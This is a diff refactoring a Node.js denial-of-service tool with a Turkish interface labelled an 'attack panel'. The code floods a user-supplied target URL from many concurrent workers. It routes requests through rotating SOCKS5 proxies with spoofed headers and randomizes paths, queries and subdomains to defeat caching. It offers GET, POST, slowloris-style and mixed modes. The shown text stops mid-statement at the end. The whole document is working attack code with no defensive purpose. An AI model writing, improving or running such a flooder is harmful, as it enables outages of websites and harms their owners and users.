@@ -5,81 +5,60 @@ const { SocksProxyAgent } = require('socks-proxy-agent');
 const { randomInt } = require('crypto');
 const readline = require('readline');
 
-// Basit spinner yerine konsol mesajı
-function logStatus(message, color) {
-    console.log(message[color || 'white']);
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout,
+});
+
+function logStatus(message, color = 'white') {
+    console.log(message[color]);
 }
 
-// Kullanıcı ajanları
 const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
     'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
 ];
 
-// Referer’lar
 const referers = ['https://google.com', 'https://bing.com', 'https://youtube.com'];
 
-// Proxy’ler
 let proxies = [];
 
-// Readline arayüzü
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout,
-});
-
-// Proxy yükleyici
 async function loadProxies() {
     logStatus('Proxy’ler yükleniyor...', 'cyan');
     try {
         const data = await fs.readFile('proxies.txt', 'utf8');
-        proxies = data.split('\n').filter(line => line.trim());
-        logStatus(proxies.length + ' proxy yüklendi!', 'green');
-    } catch {
+        proxies = data.split('\n').map(line => line.trim()).filter(Boolean);
+        logStatus(`${proxies.length} proxy yüklendi!`, 'green');
+    } catch (err) {
         logStatus('Proxy dosyası yok, direkt bağlanılıyor.', 'yellow');
     }
 }
 
-// Rastgele seçim
-function getRandom(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
-}
-function getRandomQuery() {
-    return '?r=' + Math.random().toString(36).slice(2);
-}
-function getRandomPath() {
-    return '/p' + Math.random().toString(36).slice(2, 8);
-}
-function randomDelay() {
-    return new Promise(resolve => setTimeout(resolve, randomInt(20, 300)));
-}
+const getRandom = arr => arr[Math.floor(Math.random() * arr.length)];
+const getRandomQuery = () => '?r=' + Math.random().toString(36).slice(2);
+const getRandomPath = () => '/p' + Math.random().toString(36).slice(2, 8);
+const randomDelay = () => new Promise(resolve => setTimeout(resolve, randomInt(20, 300)));
 
-// Proxy testi
 async function testProxy(proxy) {
     try {
         const [host, port] = proxy.split(':');
-        const agent = new SocksProxyAgent('socks5://' + host + ':' + port);
+        const agent = new SocksProxyAgent(`socks5://${host}:${port}`);
         await axios.get('https://api.ipify.org', { httpAgent: agent, httpsAgent: agent, timeout: 3000 });
         return true;
-    } catch {
+    } catch (error) {
         return false;
     }
 }
 
-// Rastgele subdomain
 function getRandomSubdomain(url) {
     if (Math.random() > 0.7) return url;
-    const host = url.split('/')[2];
-    const proto = url.split('/')[0];
-    return proto + '//' + Math.random().toString(36).slice(2, 8) + '.' + host;
+    const [protocol, , domain] = url.split('/');
+    const sub = Math.random().toString(36).slice(2, 8);
+    return `${protocol}//${sub}.${domain}`;
 }
 
-// HTTP isteği
-async function sendRequest(targetUrl, cookies, method) {
-    if (!cookies) cookies = {};
-    if (!method) method = 'GET';
-
+async function sendRequest(targetUrl, cookies = {}, method = 'GET') {
     const headers = {
         'User-Agent': getRandom(userAgents),
         'Accept': getRandom(['text/html,application/xhtml+xml', 'application/json', '*/*']),
@@ -90,62 +69,57 @@ async function sendRequest(targetUrl, cookies, method) {
     };
 
     if (Object.keys(cookies).length) {
-        headers['Cookie'] = Object.entries(cookies).map(function([k, v]) { return k + '=' + v; }).join('; ');
+        headers['Cookie'] = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
     }
 
     const config = {
-        headers: headers,
+        headers,
         timeout: 8000,
         maxRedirects: 10,
-        validateStatus: function() { return true; },
+        validateStatus: () => true,
     };
 
     const proxy = getRandom(proxies);
     if (proxy && await testProxy(proxy)) {
-        const hostPort = proxy.split(':');
-        const host = hostPort[0];
-        const port = hostPort[1];
-        config.httpAgent = new SocksProxyAgent('socks5://' + host + ':' + port);
-        config.httpsAgent = new SocksProxyAgent('socks5://' + host + ':' + port);
+        const [host, port] = proxy.split(':');
+        const agent = new SocksProxyAgent(`socks5://${host}:${port}`);
+        config.httpAgent = agent;
+        config.httpsAgent = agent;
     }
 
     try {
-        var url = targetUrl;
-        if (method === 'SUBDOMAIN') url = getRandomSubdomain(targetUrl);
-        url = url + (Math.random() > 0.5 ? getRandomQuery() : getRandomPath());
+        let url = method === 'SUBDOMAIN' ? getRandomSubdomain(targetUrl) : targetUrl;
+        url += Math.random() > 0.5 ? getRandomQuery() : getRandomPath();
 
-        var response;
+        let response;
         if (method === 'POST') {
             response = await axios.post(url, { data: Math.random() }, config);
         } else if (method === 'SLOWLORIS') {
             await randomDelay();
-            response = await axios.get(url, Object.assign({}, config, { timeout: 20000 }));
+            response = await axios.get(url, { ...config, timeout: 20000 });
         } else {
             response = await axios.get(url, config);
         }
 
-        var newCookies = cookies;
+        let newCookies = { ...cookies };
         if (response.headers['set-cookie']) {
-            newCookies = response.headers['set-cookie'].reduce(function(acc, cookie) {
-                var keyValue = cookie.split(';')[0];
-                var key = keyValue.split('=')[0];
-                var value = keyValue.split('=')[1];
-                acc[key] = value;
-                return acc;
-            }, cookies);
+            response.headers['set-cookie'].forEach(cookie => {
+                const [keyValue] = cookie.split(';');
+                const [key, value] = keyValue.split('=');
+                newCookies[key] = value;
+            });
         }
 
         return {
-            success: response.status < 400 || [403, 503].indexOf(response.status) !== -1,
+            success: response.status < 400 || [403, 503].includes(response.status),
             status: response.status,
             cookies: newCookies,
         };
     } catch (error) {
-        return { success: false, error: error.message, cookies: cookies };
+        return { success: false, error: error.message, cookies };
     }
 }
 
-// Kullanıcı girişi
 async function getUserInput() {
     console.clear();
     console.log('\n🌟 ' + 'SÜPER SALDIRI PANELI'.rainbow.bold + ' 🌟');
@@ -156,78 +130,53 @@ async function getUserInput() {
     console.log('4 - Subdomain (Cache Bypass)'.green);
     console.log('5 - Karışık (Hepsi)'.green);
 
-    var methodNum = await new Promise(function(resolve) { rl.question('Seçim (1-5): ', resolve); });
-    var methodMap = { '1': 'GET', '2': 'POST', '3': 'SLOWLORIS', '4': 'SUBDOMAIN', '5': 'MIXED' };
-    var method = methodMap[methodNum] || 'GET';
+    const methodNum = await new Promise(resolve => rl.question('Seçim (1-5): ', resolve));
+    const methodMap = { '1': 'GET', '2': 'POST', '3': 'SLOWLORIS', '4': 'SUBDOMAIN', '5': 'MIXED' };
+    const method = methodMap[methodNum] || 'GET';
 
-    var url = await new Promise(function(resolve) { rl.question('Hedef URL (örn: http://example.com): ', resolve); });
-    if (!url.match(/^https?:\/\//)) throw new Error('URL http:// veya https:// ile başlamalı!');
+    const url = await new Promise(resolve => rl.question('Hedef URL (örn: http://example.com): ', resolve));
+    if (!/^https?:\/\//.test(url)) throw new Error('URL http:// veya https:// ile başlamalı!');
 
-    var duration = await new Promise(function(resolve) { rl.question('Süre (saniye, örn: 60): ', resolve); });
-    var threads = await new Promise(function(resolve) { rl.question('Thread (örn: 10): ', resolve); });
+    const duration = parseInt(await new Promise(resolve => rl.question('Süre (saniye, örn: 60): ', resolve))) || 60;
+    const threads = parseInt(await new Promise(resolve => rl.question('Thread (örn: 10): ', resolve))) || 10;
 
-    var parsedDuration = parseInt(duration) || 60;
-    var parsedThreads = parseInt(threads) || 10;
+    if (duration < 1 || threads < 1) throw new Error('Süre ve thread pozitif olmalı!');
 
-    if (parsedDuration < 1 || parsedThreads < 1) throw new Error('Süre ve thread pozitif olmalı!');
-
-    return { method: method, url: url, duration: parsedDuration, threads: parsedThreads };
+    return { method, url, duration, threads };
 }
 
-// Ana fonksiyon
-async function megaBypassAttack(input) {
-    var method = input.method;
-    var url = input.url;
-    var duration = input.duration;
-    var threads = input.threads;
-
+async function megaBypassAttack({ method, url, duration, threads }) {
     await loadProxies();
     console.clear();
     console.log('\n⚡ ' + 'SALDIRI BAŞLADI!'.rainbow.bold + ' ⚡');
-    console.log('🔗 Hedef: ' + url.cyan);
-    console.log('⏰ Süre: ' + duration + 's'.cyan);
-    console.log('⚙️ Thread: ' + threads.cyan);
-    console.log('🔥 Method: ' + method.cyan);
+    console.log(`🔗 Hedef: ${url.cyan}`);
+    console.log(`⏰ Süre: ${duration}s`.cyan);
+    console.log(`⚙️ Thread: ${threads}`.cyan);
+    console.log(`🔥 Method: ${method}`.cyan);
 
     logStatus('Hazırlanıyor...', 'cyan');
-    var endTime = Date.now() + duration * 1000;
-    var successCount = 0;
-    var failCount = 0;
-    var cookies = {};
+    const endTime = Date.now() + duration * 1000;
+    let successCount = 0;
+    let failCount = 0;
+    let cookies = {};
 
     async function worker() {
         while (Date.now() < endTime) {
             await randomDelay();
-            var selectedMethod = method === 'MIXED' ? getRandom(['GET', 'POST', 'SLOWLORIS', 'SUBDOMAIN']) : method;
-            var result = await sendRequest(url, cookies, selectedMethod);
+            const selectedMethod = method === 'MIXED' ? getRandom(['GET', 'POST', 'SLOWLORIS', 'SUBDOMAIN']) : method;
+            const result = await sendRequest(url, cookies, selectedMethod);
             cookies = result.cookies;
 
             if (result.success) {
                 successCount++;
-                process.stdout.write('[+] ' + result.status + ' '.green);
+                process.stdout.write(`[+] ${result.status} `.green);
             } else {
                 failCount++;
-                process.stdout.write('[-] ' + result.error.slice(0, 20) + ' '.red);
+                process.stdout.write(`[-] ${result.error.slice(0, 20)} `.red);
             }
         }
     }
 
-    var workers = Array(threads).fill().map(function() { return worker(); });
+    const workers = Array.from({ length: threads }, () => worker());
     logStatus('Saldırı aktif!', 'green');
-    await Promise.all(workers);
-
-    console.log('\n🎉 ' + 'BİTTİ!'.rainbow.bold + ' 🎉');
-    console.log('✅ Başarılı: ' + successCount.green);
-    console.log('❌ Hata: ' + failCount.red);
-}
-
-// Çalıştır
-(function() {
-    getUserInput().then(function(input) {
-        return megaBypassAttack(input);
-    }).catch(function(err) {
-        console.error('Hata: ' + err.message.red);
-    }).finally(function() {
-        rl.close();
-    });
-})();
+    await Promise.all(workers
